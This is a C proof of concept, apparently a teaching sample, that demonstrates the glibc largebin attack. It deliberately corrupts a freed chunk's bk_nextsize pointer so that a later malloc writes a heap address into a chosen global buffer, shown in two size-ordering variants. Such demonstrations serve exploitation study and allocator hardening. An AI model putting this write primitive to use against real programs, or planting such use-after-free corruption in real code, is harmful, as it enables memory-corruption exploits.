#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<stdint.h>


// arbwrite chunk address
size_t buf[0x10];

/**
 * unsortbin chunk is larger than largebin
 */
size_t *ptr, *ptr2, *ptr3;
void test1(){

    ptr = malloc(0x438);
    malloc(0x18);
    ptr2 = malloc(0x448);
    malloc(0x18);
    free(ptr);
    // put ptr into large bin
    malloc(0x600);
    // put ptr2 into unsortbin
    free(ptr2);

    ptr[2]=0; // fd_nextsize
    ptr[3]=(size_t)&buf[0]; // bk_nextsize

    fprintf(stderr,"buf[4]: 0x%lx\n", buf[4]); // write to buf->fd_nextsize (+0x20)
    ptr3 = malloc(0x68);
    /**
     * ptr2 is victim (prev in unsortbin)
     * ptr is fwd (prev in largebin)
     * and use `two` place to write
     * 
     * victim[2,3] will update eq [fwd,target]
     * fwd[3] will eq victim
     * target+0x20 will eq victim
     */
    fprintf(stderr,"buf[4]: 0x%lx\n", buf[4]);
}


/**
 * unsortbin chunk is smaller than largebin
 */
void test2(){
    ptr = malloc(0x448);
    malloc(0x18);
    ptr2 = malloc(0x438);
    malloc(0x18);
    free(ptr);  
    // put ptr into large bin
    malloc(0x600);
    // put ptr2 into unsortbin
    free(ptr2);

    ptr[2]=0; // fd_nextsize
    ptr[3]=(size_t)&buf[0]; // bk_nextsize

    fprintf(stderr,"buf[4]: 0x%lx\n", buf[4]);
    ptr3 = malloc(0x68);
    /**
     * ptr2 is victim (prev in unsortbin)
     * <main_arena+1120> is fwd (prev in largebin)
     * <place> fd and bk is point to ptr
     * and use `one` place to write
     * 
     * victim[2,3] will update eq [fwd,target]
     * ptr[3] will eq victim
     * target+0x20 will eq victim
     */
    fprintf(stderr,"buf[4]: 0x%lx\n", buf[4]);
}


// the two ways is equal=.=
int main(){
    // test1();
    test2();
    return 0;
}
